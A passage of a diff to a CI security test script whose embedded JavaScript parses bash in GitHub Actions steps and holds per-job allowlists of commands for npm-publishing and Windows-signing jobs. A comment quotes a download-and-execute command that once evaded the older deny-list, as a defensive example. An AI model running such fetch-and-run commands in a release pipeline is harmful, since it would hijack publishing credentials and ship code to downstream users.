@@ -18,7 +18,12 @@
 #      or a `pull_request_target` trigger. A fixed list of "the publish path"
 #      missed release.yml and sync-pieces-catalog.yml, whose tokens can create
 #      a v* tag and dispatch a real release, and installer-release.yml, which
-#      signs and publishes installers.
+#      signs and publishes installers. (#984) The same holds for every
+#      workflow a push or a pull request can start, whatever it holds: a PR
+#      opened with RELEASE_PR_TOKEN starts its CI with no approval, on a tree
+#      carrying freshly fetched upstream data, so a moved tag there runs on
+#      the runner unattended. Derived the same way: any trigger other than
+#      schedule and workflow_dispatch, which no push or PR can cause, counts.
 #   4. The catalog sync (#686) handles third-party data -- the activepieces
 #      monorepo, npm registry answers, and the dependencies whose lifecycle
 #      scripts `bun install` runs -- only in jobs with no write scope and no
@@ -45,7 +50,9 @@
 #      the runner own GITHUB_*/RUNNER_*/ACTIONS_* names) or is an
 #      expression, every name it sets is one these jobs already use, it has
 #      no container or services, no step of it writes GITHUB_ENV or
-#      GITHUB_PATH, and its shells are plain; on the release path no
+#      GITHUB_PATH, and its shells are plain; (#1030) all of that also in a
+#      job that installs npm from its checked tarball or runs npm pack,
+#      whatever it holds (pack-brain); on the release path no
 #      checkout leaves its token in
 #      the repository config; no registry login happens on a dry run; and
 #      (#781) a privileged job takes an artifact only by a digest another
@@ -65,7 +72,21 @@
 #      its CI runs and main's required `test` check can pass (#935); a step
 #      before it refuses an empty secret; the PAT is read nowhere else; and
 #      rule 4 counts a job that reads any non-GITHUB_TOKEN secret as holding
-#      write, where no JavaScript runtime may run at all.
+#      write, where no JavaScript runtime may run at all. (#983) The same for
+#      every workflow that opens a PR with create-pull-request (the webview_go
+#      bump too), and no Go build or test and no repository script runs where
+#      a write scope or a secret is held either; the webview PR job takes from
+#      its artifact exactly the vendored tree, hidden files included, and no
+#      link and no .git (that step executed against hostile fixtures).
+#   9. (#1029) The two npm publishing jobs, publish-brain and publish-sidecar,
+#      and every other job holding id-token (the two Windows signers), run
+#      only the commands listed for them: each run: is read as bash, every
+#      command found (substitutions included) must be on the job list, the
+#      ones that can fetch, write, run a program or load code only in their
+#      listed text, every assignment, function call, array and for list
+#      as listed, no write by redirection but to /dev/null, $GITHUB_OUTPUT
+#      or another descriptor, and the list is exactly what the jobs run. A
+#      job holding id-token with no list fails. See runAllow.
 #
 # Each rule is also run against a mutated copy that breaks it, and must report
 # it, so a neutered check fails here instead of passing everything.
@@ -96,8 +117,9 @@ WORK="$(mktemp -d)" || exit 1
 trap 'rm -rf "$WORK"' EXIT
 
 # check <rule> <file>: one violation per line, nothing when clean.
-#   rule = scoped | publish-perms | pinned | authority | untrusted | mutable
-#          | narrow | pushcache | catalog-pr | npmpin
+#   rule = scoped | publish-perms | pinned | authority | reach | untrusted
+#          | mutable | narrow | pushcache | opens-pr | catalog-pr | npmpin
+#          | runs
 check() {
 	# shellcheck disable=SC2016 # JavaScript source, not shell: nothing should expand.
 	RULE="$1" FILE="$2" REPO="${REPO_DIR:-${HERE}/../..}" bun -e '
@@ -132,6 +154,581 @@ const flatSteps = (steps, via = "", depth = 0) => {
   }
   return outSteps;
 };
+// shRead(src): the simple commands of a bash script, as this rule reads them.
+// Returns { cmds: [{ name, words, redirs, assigns }], funcs, arrays, unread }.
+// A substitution ($( ), backticks, <( ), >( )) is read as a script of its own
+// wherever it sits, in a word, a [[ ]], a case pattern or a for list, so the
+// commands inside always count. Anything outside the subset read here is
+// listed in unread, and the rule refuses it rather than guess.
+const shRead = (src) => {
+  const cmds = [], funcs = [], arrays = [], fors = [], unread = [];
+  const n = src.length;
+  let i = 0;
+  const sp = (c) => c === " " || c === "\t";
+  const take = (r) => { cmds.push(...r.cmds); funcs.push(...r.funcs); arrays.push(...r.arrays); fors.push(...r.fors); unread.push(...r.unread); };
+  // From just after an opener to its closer; the inside read as a script.
+  const sub = (closer) => {
+    const start = i;
+    let depth = 0, q = "";
+    for (; i < n; i++) {
+      const c = src[i];
+      if (q === "\x27") { if (c === "\x27") q = ""; continue; }
+      if (q === "a") { if (c === "\\") i++; else if (c === "\x27") q = ""; continue; }
+      if (c === "\\") { i++; continue; }
+      if (q === "\"") { if (c === "\"") q = ""; continue; }
+      if (c === "$" && src[i + 1] === "\x27") { q = "a"; i++; continue; }
+      if (c === "\x27" || c === "\"") { q = c; continue; }
+      if (c === "#" && closer === ")" && (i === start || /[\s;&|(]/.test(src[i - 1]))) { unread.push("a comment inside a substitution"); continue; }
+      if (closer === "`") { if (c === "`") break; continue; }
+      if (c === "(") depth++;
+      else if (c === ")") { if (depth === 0) break; depth--; }
+    }
+    if (i >= n) { unread.push("an unclosed substitution"); return; }
+    take(shRead(src.slice(start, i)));
+    i++;
+  };
+  // ${...}: only the forms that evaluate no arithmetic and take no subscript
+  // but a literal one.
+  const param = () => {
+    const start = i;
+    let depth = 1, q = "";
+    for (; i < n; i++) {
+      const c = src[i];
+      if (q === "\x27") { if (c === "\x27") q = ""; continue; }
+      if (c === "\\") { i++; continue; }
+      if (c === "$" && src[i + 1] === "(" && src[i + 2] !== "(") { i += 2; sub(")"); i--; continue; }
+      if (c === "`") { i++; sub("`"); i--; continue; }
+      if (q === "\"") { if (c === "\"") q = ""; continue; }
+      if (c === "\x27" || c === "\"") { q = c; continue; }
+      if (c === "{") depth++;
+      else if (c === "}" && --depth === 0) break;
+    }
+    if (i >= n) { unread.push("an unclosed ${"); return; }
+    const body = src.slice(start, i);
+    i++;
+    const m = /^#?(?:[A-Za-z_][A-Za-z0-9_]*|[0-9]+|[@*#?$!-])(?:\[(?:[0-9]+|@|\*)\])?([\s\S]*)$/.exec(body);
+    if (!m || (m[1] !== "" && !/^(?::?[-=+?]|##?|%%?|\/\/?)/.test(m[1])))
+      unread.push("the parameter expansion ${" + body + "} (a subscript, a substring or an indirection)");
+  };
+  // One word, as written, quotes kept.
+  const word = () => {
+    const start = i;
+    let q = "";
+    for (; i < n; i++) {
+      const c = src[i];
+      if (q === "\x27") { if (c === "\x27") q = ""; continue; }
+      if (q === "a") { if (c === "\\") i++; else if (c === "\x27") q = ""; continue; }
+      if (c === "\\") { i++; continue; }
+      if (c === "$" && src.startsWith("((", i + 1)) { unread.push("an arithmetic expansion"); i += 2; continue; }
+      if (c === "$" && src[i + 1] === "(") { i += 2; sub(")"); i--; continue; }
+      if (c === "$" && src[i + 1] === "{") { i += 2; param(); i--; continue; }
+      if (c === "`") { i++; sub("`"); i--; continue; }
+      if (q === "\"") { if (c === "\"") q = ""; continue; }
+      if (c === "$" && src[i + 1] === "\x27") { q = "a"; i++; continue; }
+      if (c === "\x27" || c === "\"") { q = c; continue; }
+      if ((c === "<" || c === ">") && src[i + 1] === "(") { i += 2; sub(")"); i--; continue; }
+      if (c === "=" && src[i + 1] === "(" && /^[A-Za-z_][A-Za-z0-9_]*\+?$/.test(src.slice(start, i))) {
+        // An array literal: NAME=( ... ) or NAME+=( ... ), its items kept.
+        const name = src.slice(start, i).replace(/\+$/, "");
+        i += 2;
+        const at = i;
+        let depth = 0;
+        for (; i < n && !(src[i] === ")" && depth === 0); i++) {
+          if (src[i] === "(") depth++;
+          else if (src[i] === ")") depth--;
+          else if (/[$`\x27"\\]/.test(src[i])) unread.push("an array literal holding quotes or expansions");
+        }
+        arrays.push({ name, items: src.slice(at, i).trim().split(/\s+/).filter(Boolean) });
+        continue;
+      }
+      if (sp(c) || c === "\n" || ";&|()<>".includes(c)) break;
+    }
+    if (q) unread.push("an unclosed quote");
+    return src.slice(start, i);
+  };
+  const toks = [];
+  while (i < n) {
+    const c = src[i];
+    if (sp(c)) { i++; continue; }
+    if (c === "\\" && src[i + 1] === "\n") { i += 2; continue; }
+    if (c === "#") { while (i < n && src[i] !== "\n") i++; continue; }
+    if (c === "\n") { toks.push({ op: ";" }); i++; continue; }
+    const two = src.slice(i, i + 2), three = src.slice(i, i + 3);
+    if (three === "<<<" || three === "&>>" || three === ";;&") { toks.push({ op: three }); i += 3; continue; }
+    if (two === "<<") { unread.push("a heredoc"); i += 2; continue; }
+    if (two === "((") { unread.push("an arithmetic command"); i += 2; continue; }
+    if ((c === "<" || c === ">") && src[i + 1] === "(") { toks.push({ w: word() }); continue; }
+    if (["&&", "||", ";;", ";&", "|&", ">>", ">&", "<&", "&>", ">|", "<>"].includes(two)) { toks.push({ op: two }); i += 2; continue; }
+    if (";&|()<>".includes(c)) { toks.push({ op: c }); i++; continue; }
+    if (two === "[[" && (i + 2 >= n || sp(src[i + 2]))) {
+      // Read whole: a regex there holds ( ) | unquoted.
+      i += 2;
+      const start = i;
+      let q = "";
+      for (; i < n; i++) {
+        const d = src[i];
+        if (q === "\x27") { if (d === "\x27") q = ""; continue; }
+        if (q === "a") { if (d === "\\") i++; else if (d === "\x27") q = ""; continue; }
+        if (d === "\\") { i++; continue; }
+        if (d === "$" && src[i + 1] === "(" && src[i + 2] !== "(") { i += 2; sub(")"); i--; continue; }
+        if (d === "$" && src[i + 1] === "{") { i += 2; param(); i--; continue; }
+        if (d === "`") { i++; sub("`"); i--; continue; }
+        if (q === "\"") { if (d === "\"") q = ""; continue; }
+        if (d === "$" && src[i + 1] === "\x27") { q = "a"; i++; continue; }
+        if (d === "\x27" || d === "\"") { q = d; continue; }
+        if (d === "\n") { unread.push("a [[ ]] across lines"); break; }
+        if (d === "]" && src[i + 1] === "]" && sp(src[i - 1]) && (i + 2 >= n || /[\s;&|)]/.test(src[i + 2]))) break;
+      }
+      if (i >= n || src[i] !== "]") unread.push("an unclosed [[");
+      const body = src.slice(start, i);
+      // An integer comparison there evaluates its operands as arithmetic,
+      // which runs a $( ) that an operand only spells, even quoted.
+      if (/(?:^|\s)-(?:eq|ne|lt|le|gt|ge)(?=\s|$)/.test(body)) unread.push("an integer comparison inside [[ ]]");
+      toks.push({ cond: body });
+      i += 2;
+      continue;
+    }
+    const fd = /^[0-9]+(?=[<>])/.exec(src.slice(i, i + 4));
+    if (fd) { i += fd[0].length; continue; }
+    toks.push({ w: word() });
+  }
+  // Commands from the tokens.
+  const reserved = new Set(["if", "then", "elif", "else", "fi", "do", "done", "while", "until", "!", "{", "}"]);
+  const refused = new Set(["select", "coproc", "time", "function", "let", "in", "esac", "[[", "]]", "eval", "source", "."]);
+  const sep = new Set([";", "&", "&&", "||", "|", "|&", "(", ")"]);
+  const redirOps = new Set([">", ">>", ">|", "&>", "&>>", "<>", ">&", "<", "<<<", "<&"]);
+  const cases = [];
+  let t = 0;
+  while (t < toks.length) {
+    const k = toks[t];
+    const top = cases[cases.length - 1];
+    if (top === "pattern") {
+      if (k.op === ";") { t++; continue; }
+      if (k.w === "esac") { cases.pop(); t++; continue; }
+      if (k.op === "(") t++;
+      while (t < toks.length && toks[t].op !== ")") t++;
+      t++;
+      cases[cases.length - 1] = "body";
+      continue;
+    }
+    if (top === "body" && (k.op === ";;" || k.op === ";&" || k.op === ";;&")) { cases[cases.length - 1] = "pattern"; t++; continue; }
+    if (top === "body" && k.w === "esac") { cases.pop(); t++; continue; }
+    if (k.op && sep.has(k.op)) { t++; continue; }
+    if (k.op === ";;" || k.op === ";&" || k.op === ";;&") { unread.push("a case terminator outside a case"); t++; continue; }
+    if (k.cond !== undefined) { t++; continue; }
+    if (k.w !== undefined && reserved.has(k.w)) { t++; continue; }
+    if (k.w === "for") {
+      if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(toks[t + 1]?.w ?? "") || toks[t + 2]?.w !== "in") { unread.push("a for loop of another shape"); t++; continue; }
+      const v = toks[t + 1].w;
+      t += 3;
+      const items = [];
+      while (t < toks.length && toks[t].op !== ";") { if (toks[t].w === undefined) unread.push("a for list holding an operator"); else items.push(toks[t].w); t++; }
+      fors.push({ v, items });
+      continue;
+    }
+    if (k.w === "case") {
+      if (toks[t + 1]?.w === undefined || toks[t + 2]?.w !== "in") { unread.push("a case of another shape"); t++; continue; }
+      cases.push("pattern");
+      t += 3;
+      continue;
+    }
+    if (k.w !== undefined && toks[t + 1]?.op === "(" && toks[t + 2]?.op === ")") { funcs.push(k.w); t += 3; continue; }
+    // A simple command: assignments, redirections, then a name and words.
+    const c = { name: null, words: [], redirs: [], assigns: [] };
+    while (t < toks.length && !(toks[t].op && (sep.has(toks[t].op) || toks[t].op.startsWith(";")))) {
+      const x = toks[t];
+      if (top === "body" && x.w === "esac" && c.name === null) break;
+      if (x.op && redirOps.has(x.op)) {
+        if (toks[t + 1]?.w === undefined) unread.push("a redirection with no target");
+        c.redirs.push({ op: x.op, target: toks[t + 1]?.w ?? "" });
+        t += 2;
+        continue;
+      }
+      if (x.cond !== undefined) { unread.push("a [[ ]] inside a command"); t++; continue; }
+      if (x.op) { unread.push("the operator " + x.op); t++; continue; }
+      if (c.name === null && /^[A-Za-z_][A-Za-z0-9_]*\+?=/.test(x.w)) { c.assigns.push(x.w); t++; continue; }
+      if (c.name === null && refused.has(x.w)) unread.push("the shell word " + x.w);
+      if (c.name === null) c.name = x.w; else c.words.push(x.w);
+      t++;
+    }
+    // A bare assignment is kept too: its value reaches the commands after it.
+    if (c.name !== null || c.redirs.length || c.assigns.length) cmds.push(c);
+  }
+  if (cases.length) unread.push("an unclosed case");
+  return { cmds, funcs, arrays, fors, unread };
+};
+if (rule === "runs") {
+  // #1029: the commands the two npm publishing jobs run are listed, not the
+  // ones they must not run, and (security review of #1029) so are those of
+  // every other job holding id-token: today the two Windows signers, which
+  // federate into the KMS signing key. narrow refuses runtimes and package managers,
+  // and that list could never be complete: `curl -o /tmp/x URL; chmod +x
+  // /tmp/x; /tmp/x` passed it in the one job that mints an npm publish
+  // token. Here a new command in either job fails until it is added below,
+  // with a reason, the way their uses: and their env names (knownEnv) are.
+  //
+  // How a command is identified. Each run: is read as bash by shRead: words
+  // and quotes as bash splits them; commands split at newlines, ; & && ||
+  // | |& and ( ), and found after if then elif else while until do ! { };
+  // assignments in front skipped; the patterns of a case and the list of a
+  // for read as data; and every $( ), backtick, <( ) and >( ), wherever it
+  // sits (in a word, a quote, a [[ ]], a pattern, a for list, an array
+  // subscript), read as a script of its own, so a command inside one is a
+  // command. The name is the first word after that. A construct shRead does
+  // not read (a heredoc, arithmetic, an integer test in [[ ]], a subscript
+  // or substring that evaluates arithmetic, select, coproc, time, eval,
+  // source, a comment inside a substitution) is refused rather than guessed.
+  //
+  // Then, for each command:
+  //   - its name is a plain word (not a path, not an expansion) unless it is
+  //     a listed form (scripts/sign-windows.sh, whose own text is repository
+  //     content, like the package.json scripts below), so nothing
+  //     downloaded or written can be run by its path, and is on the list:
+  //     free (any arguments: it can neither fetch, write a file it is given,
+  //     run another program nor load code by an option) or pinned (its whole
+  //     text, name and words as written, is one of the listed forms: curl
+  //     fetches and writes, openssl loads engines, tar and cp and tee write,
+  //     sed and find and xargs and sort run programs, npm and set and export
+  //     and cd change what runs next). Without the pin, curl -o over the npm
+  //     on PATH, then the allowed npm publish, is the same attack;
+  //   - nothing is put in front of it but LC_ALL=C;
+  //   - it writes by redirection only to /dev/null, $GITHUB_OUTPUT or
+  //     another descriptor;
+  //   - printf takes no -v, which assigns a variable unseen.
+  // Functions are listed too, may not take the name of a command, and are
+  // called only in the step that defines them (a binary of that name, expect
+  // for one, may be on PATH), and each call only as listed, since its
+  // arguments reach the forms inside it. Every assignment (a bare one, as
+  // written), array literal and for list is listed too, since their values
+  // reach the pinned forms (review of #1029: a VERSION reassigned before the
+  // pinned sed -i would hand sed a script of its own, and GNU sed scripts
+  // run commands).
+  // And the list is exactly what the jobs run: an entry no step uses is
+  // reported, so nothing stays allowed after the step that needed it went.
+  //
+  // Not covered: the values a step takes from its env: (job outputs and
+  // inputs, which the scripts check before use, #684, #781) and from the
+  // runner reach the listed forms as they come; a redirection to
+  // "$GITHUB_OUTPUT" is matched as that text, which holds because narrow
+  // refuses any GITHUB_* name being set; and npm runs lifecycle scripts of
+  // the package.json in a directory it publishes or versions
+  // (publish-sidecar), which is repository content, not run: text.
+  const runAllow = {
+    "publish-brain": {
+      free: ["[", "base64", "echo", "exit", "sha256sum"],
+      pinned: {
+        curl: [
+          "curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o \"$npm_tgz\" \"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz\"",
+        ],
+        mktemp: [
+          "mktemp -d /tmp/npm.XXXXXXXXXX",
+        ],
+        npm: [
+          "npm --version",
+          "npm install -g --offline --ignore-scripts \"$npm_tgz\"",
+          "npm publish \"${RUNNER_TEMP}/brain-pack/${TARBALL}\" --access public \"${flags[@]}\"",
+          "npm view \"${pkg}@${VERSION}\" version",
+        ],
+        openssl: [
+          "openssl dgst -sha512 -binary \"$npm_tgz\"",
+        ],
+        set: [
+          "set -euo pipefail",
+        ],
+      },
+      funcs: [],
+      arrays: ["flags=()", "flags=(--dry-run)", "flags=(--tag next)"],
+      fors: [],
+      calls: [
+      ],
+      assigns: [
+        "got=\"$(npm --version)\"",
+        "got=\"sha512-$(openssl dgst -sha512 -binary \"$npm_tgz\" | base64 -w0)\"",
+        "npm_tgz=\"$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz\"",
+        "pkg=\"@usejarvis/brain\"",
+      ],
+    },
+    "publish-sidecar": {
+      free: ["[", "base64", "cut", "echo", "exit", "grep", "mkdir", "printf", "return", "sha256sum", "true"],
+      pinned: {
+        cd: [
+          "cd \"$GITHUB_WORKSPACE\"",
+          "cd \"${pkg_dir}\"",
+          "cd \"sidecar/npm/${platform}\"",
+          "cd -P \"$1\"",
+          "cd artifacts",
+          "cd sidecar/npm/jarvis-sidecar",
+        ],
+        chmod: [
+          "chmod +x \"${pkg_dir}/bin/\"*",
+        ],
+        cp: [
+          "cp \"artifacts/sidecar-${platform}/\"* \"${pkg_dir}/bin/\"",
+        ],
+        curl: [
+          "curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o \"$npm_tgz\" \"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz\"",
+          "curl -fsSL --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 268435456 -o \"${tmp}/npm.tgz\" \"$url\"",
+        ],
+        diff: [
+          "diff <(printf \x27%s\\n\x27 \"$ours\") <(printf \x27%s\\n\x27 \"$theirs\")",
+          "diff <(printf \x27%s\\n\x27 \"$want\") <(printf \x27%s\\n\x27 \"$got\")",
+        ],
+        export: [
+          "export LC_ALL=C",
+        ],
+        find: [
+          "find \"${tmp}/x\" -mindepth 1 -maxdepth 1 -printf \x27%P %y\\n\x27",
+          "find . -mindepth 1 -not -type d",
+          "find . -mindepth 1 -not -type d -not -type f -print -quit",
+          "find . -mindepth 1 -not -type d -printf \x27%y %P\\n\x27",
+          "find . -name \x27*[![:print:]]*\x27 -print -quit",
+          "find . -type f -print0",
+          "find bin -type f -print -quit",
+        ],
+        local: [
+          "local url integrity tmp got names types ours theirs",
+        ],
+        mktemp: [
+          "mktemp",
+          "mktemp -d",
+          "mktemp -d /tmp/npm.XXXXXXXXXX",
+        ],
+        npm: [
+          "npm --version",
+          "npm install -g --offline --ignore-scripts \"$npm_tgz\"",
+          "npm publish --access public \"${flags[@]}\"",
+          "npm version \"${VERSION}\" --no-git-tag-version --allow-same-version",
+          "npm view \"${1}@${VERSION}\" dist.integrity",
+          "npm view \"${1}@${VERSION}\" dist.tarball",
+          "npm view \"${pkg}@${VERSION}\" version",
+        ],
+        openssl: [
+          "openssl dgst -sha512 -binary \"$npm_tgz\"",
+          "openssl dgst -sha512 -binary \"${tmp}/npm.tgz\"",
+        ],
+        sed: [
+          "sed \x27s|^\\./||\x27",
+          "sed -i \"s|\\\"@usejarvis/sidecar-${platform}\\\": \\\".*\\\"|\\\"@usejarvis/sidecar-${platform}\\\": \\\"${VERSION}\\\"|\" package.json",
+        ],
+        set: [
+          "set -euo pipefail",
+          "set -o pipefail",
+        ],
+        sort: [
+          "sort",
+          "sort -z",
+        ],
+        tar: [
+          "tar --quoting-style=escape -tvzf \"${tmp}/npm.tgz\"",
+          "tar --quoting-style=escape -tzf \"${tmp}/npm.tgz\"",
+          "tar -xzf \"${tmp}/npm.tgz\" -C \"${tmp}/x\" --no-same-owner --no-same-permissions",
+          "tar -xzf \"artifacts/sidecar-${platform}/jarvis-app.tar.gz\" -C \"${pkg_dir}/bin/\"",
+        ],
+        tee: [
+          "tee \"$err\"",
+        ],
+        xargs: [
+          "xargs -0 -r sha256sum",
+          "xargs -0 sha256sum",
+        ],
+      },
+      funcs: ["expect", "manifest", "same_as_npm"],
+      arrays: ["flags=()", "flags=(--dry-run)", "flags=(--tag next)"],
+      fors: ["platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64"],
+      calls: [
+        "expect \"$SHA_DARWIN_ARM64\" \"sidecar-darwin-arm64/jarvis-app.tar.gz\"",
+        "expect \"$SHA_DARWIN_X64\" \"sidecar-darwin-x64/jarvis-app.tar.gz\"",
+        "expect \"$SHA_LINUX_ARM64\" \"sidecar-linux-arm64/${SIDECAR_BIN}\"",
+        "expect \"$SHA_LINUX_X64\" \"sidecar-linux-x64/${SIDECAR_BIN}\"",
+        "expect \"$SHA_WIN32_X64\" \"sidecar-win32-x64/${SIDECAR_BIN}.exe\"",
+        "manifest \"${tmp}/x/package\"",
+        "manifest .",
+        "same_as_npm \"$pkg\"",
+      ],
+      assigns: [
+        "SHA_DARWIN_ARM64=\"${BASH_REMATCH[3]}\"",
+        "SHA_DARWIN_X64=\"${BASH_REMATCH[4]}\"",
+        "SHA_LINUX_ARM64=\"${BASH_REMATCH[2]}\"",
+        "SHA_LINUX_X64=\"${BASH_REMATCH[1]}\"",
+        "SHA_WIN32_X64=\"${BASH_REMATCH[5]}\"",
+        "VERSION=\"${BUILT_VERSION:-}\"",
+        "VERSION=\"${GIVEN_VERSION:-}\"",
+        "err=\"$(mktemp)\"",
+        "got=\"$(find . -mindepth 1 -not -type d | sed \x27s|^\\./||\x27 | sort)\"",
+        "got=\"$(npm --version)\"",
+        "got=\"$(openssl dgst -sha512 -binary \"${tmp}/npm.tgz\" | base64 -w0)\"",
+        "got=\"sha512-$(openssl dgst -sha512 -binary \"$npm_tgz\" | base64 -w0)\"",
+        "h=\x27([0-9a-f]{64})\x27",
+        "id=\x27(0|[1-9][0-9]*|[0-9]*[A-Za-z-][0-9A-Za-z-]*)\x27",
+        "integrity=\"$(npm view \"${1}@${VERSION}\" dist.integrity)\"",
+        "manifest+=\"$1  $2\"$\x27\\n\x27",
+        "manifest=\"\"",
+        "names=\"$(tar --quoting-style=escape -tzf \"${tmp}/npm.tgz\")\"",
+        "npm_tgz=\"$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz\"",
+        "ours=\"$(manifest .)\"",
+        "pkg=\"@usejarvis/sidecar\"",
+        "pkg=\"@usejarvis/sidecar-${platform}\"",
+        "pkg_dir=\"sidecar/npm/${platform}\"",
+        "re=\"^linux-x64=${h} linux-arm64=${h} darwin-arm64=${h} darwin-x64=${h} win32-x64=${h}\\$\"",
+        "same=$?",
+        "same=0",
+        "sums=\"$(cd artifacts && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | base64 -w0)\"",
+        "theirs=\"$(manifest \"${tmp}/x/package\")\"",
+        "tmp=\"$(mktemp -d)\"",
+        "types=\"$(tar --quoting-style=escape -tvzf \"${tmp}/npm.tgz\" | cut -c1)\"",
+        "url=\"$(npm view \"${1}@${VERSION}\" dist.tarball)\"",
+        "want=\"$(printf \x27%s\x27 \"$manifest\" | cut -d\x27 \x27 -f3- | sort)\"",
+      ],
+    },
+    "sign-sidecar-windows": {
+      free: ["[", "cut", "echo", "exit", "sha256sum"],
+      pinned: {
+        find: [
+          "find \"$in\" -mindepth 1 -print",
+        ],
+        install: [
+          "install -m 0644 \"${in}/${SIDECAR_BIN}.exe\" \"${SIDECAR_BIN}.exe\"",
+        ],
+        "scripts/sign-windows.sh": [
+          "scripts/sign-windows.sh --defer-verify \"${SIDECAR_BIN}.exe\"",
+        ],
+        set: [
+          "set -euo pipefail",
+        ],
+      },
+      funcs: [],
+      arrays: [],
+      fors: [],
+      calls: [
+      ],
+      assigns: [
+        "fix=\"Issue the certificate and commit sidecar/packaging/windows/codesign-chain.pem\"",
+        "fix=\"Set the GCP_KMS_KEYRING repository variable\"",
+        "in=\"${RUNNER_TEMP}/unsigned\"",
+        "missing=\"\"",
+        "missing=\"GCP_KMS_KEYRING is set but sidecar/packaging/windows/codesign-chain.pem is missing -- the certificate has not been issued/committed yet\"",
+        "missing=\"Windows signing is not configured (GCP_KMS_KEYRING unset)\"",
+      ],
+    },
+    "sign-windows": {
+      free: ["[", "cut", "echo", "exit", "sha256sum"],
+      pinned: {
+        find: [
+          "find \"$in\" -mindepth 1 -print",
+        ],
+        install: [
+          "install -m 0644 \"${in}/Jarvis-Setup.exe\" Jarvis-Setup.exe",
+        ],
+        "scripts/sign-windows.sh": [
+          "scripts/sign-windows.sh --defer-verify Jarvis-Setup.exe",
+        ],
+        set: [
+          "set -euo pipefail",
+        ],
+      },
+      funcs: [],
+      arrays: [],
+      fors: [],
+      calls: [
+      ],
+      assigns: [
+        "fix=\"Issue the certificate and commit sidecar/packaging/windows/codesign-chain.pem\"",
+        "fix=\"Set the GCP_KMS_KEYRING repository variable\"",
+        "in=\"${RUNNER_TEMP}/unsigned\"",
+        "missing=\"\"",
+        "missing=\"GCP_KMS_KEYRING is set but sidecar/packaging/windows/codesign-chain.pem is missing -- the certificate has not been issued/committed yet\"",
+        "missing=\"Windows signing is not configured (GCP_KMS_KEYRING unset)\"",
+      ],
+    },
+  };
+  const writesOidc = (perm) => perm === "write-all" || (perm && typeof perm === "object" && perm["id-token"] === "write");
+  const outOps = new Set([">", ">>", ">|", "&>", "&>>", "<>"]);
+  for (const [name, job] of Object.entries(jobs)) {
+    if (typeof job.uses === "string") continue;
+    const steps = flatSteps(job.steps);
+    const allText = steps.map(({ st }) => typeof st.run === "string" ? st.run : "").join("\n");
+    const allow = Object.hasOwn(runAllow, name) ? runAllow[name] : null;
+    // Every job holding id-token has a list, whatever it runs: one that
+    // only had to when it ran npm publish let an added job, or a signer,
+    // download and run anything (security review of #1029).
+    if (!allow) {
+      if (writesOidc(job.permissions ?? doc.permissions))
+        out.push(name + ": holds id-token and has no list of the commands it may run (#1029): add one to runAllow");
+      continue;
+    }
+    if (process.env.RUNS_REPORT) out.push("checked " + name);
+    const listed = new Set([...allow.free, ...Object.keys(allow.pinned)]);
+    for (const f of allow.funcs) if (listed.has(f)) out.push(name + ": runAllow lists " + f + " as a function and as a command");
+    const used = { free: new Set(), forms: new Set(), funcs: new Set(), arrays: new Set(), fors: new Set(), calls: new Set(), assigns: new Set() };
+    const plainShell = ["bash", "bash -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
+    for (const [i, { st, via }] of steps.entries()) {
+      if (typeof st.run !== "string") continue;
+      const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
+      // shRead reads bash, so the step must run in bash.
+      const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
+      if (sh !== undefined && !plainShell.includes(String(sh).trim())) out.push(label + " runs in shell: " + sh + ", which this rule does not read (#1029)");
+      const r = shRead(st.run);
+      for (const u of r.unread) out.push(label + " holds " + u + ", which this rule does not read (#1029)");
+      for (const f of r.funcs) {
+        used.funcs.add(f);
+        if (listed.has(f)) out.push(label + " defines a function " + f + " over a command (#1029)");
+        else if (!allow.funcs.includes(f)) out.push(label + " defines a function " + f + ", which is not on the " + name + " list (#1029)");
+      }
+      for (const a of r.arrays) {
+        const key = a.name + "=(" + a.items.join(" ") + ")";
+        used.arrays.add(key);
+        if (!allow.arrays.includes(key)) out.push(label + " sets the array " + key + ", which is not on the " + name + " list (#1029)");
+      }
+      for (const fl of r.fors) {
+        const key = fl.v + " in " + fl.items.join(" ");
+        used.fors.add(key);
+        if (!allow.fors.includes(key)) out.push(label + " loops over " + key + ", which is not on the " + name + " list (#1029)");
+      }
+      for (const c of r.cmds) {
+        for (const rd of c.redirs)
+          if ((outOps.has(rd.op) && rd.target !== "/dev/null" && rd.target !== "\"$GITHUB_OUTPUT\"") ||
+              ((rd.op === ">&" || rd.op === "<&") && !/^(?:[0-9]+|-)$/.test(rd.target)))
+            out.push(label + " writes to " + rd.target + " (only /dev/null, $GITHUB_OUTPUT or another descriptor) (#1029)");
+        if (c.name === null) {
+          for (const a of c.assigns) {
+            if (/^[A-Za-z_][A-Za-z0-9_]*\+?=\(/.test(a)) continue;
+            used.assigns.add(a);
+            if (!allow.assigns.includes(a)) out.push(label + " assigns " + JSON.stringify(a) + ", which is not on the " + name + " list (#1029)");
+          }
+          continue;
+        }
+        for (const a of c.assigns) if (a !== "LC_ALL=C") out.push(label + " runs " + c.name + " with " + a + " in front, where only LC_ALL=C may go (#1029)");
+        if (!Object.hasOwn(allow.pinned, c.name) && !/^(?:[A-Za-z_][A-Za-z0-9_.-]*|\[)$/.test(c.name)) {
+          out.push(label + " runs " + c.name + ", which is not a plain command name this rule can check (a path or an expansion) (#1029)");
+          continue;
+        }
+        if (r.funcs.includes(c.name)) {
+          const call = [c.name, ...c.words].join(" ");
+          used.calls.add(call);
+          if (!allow.calls.includes(call)) out.push(label + " calls " + JSON.stringify(call) + ", which is not one of the calls listed (#1029)");
+          continue;
+        }
+        if (allow.funcs.includes(c.name)) { out.push(label + " calls " + c.name + ", a function this step does not define (#1029)"); continue; }
+        const form = [c.name, ...c.words].join(" ");
+        if (Object.hasOwn(allow.pinned, c.name)) {
+          used.forms.add(form);
+          if (!allow.pinned[c.name].includes(form)) out.push(label + " runs " + JSON.stringify(form) + ", which is not one of the forms listed for " + c.name + " (#1029)");
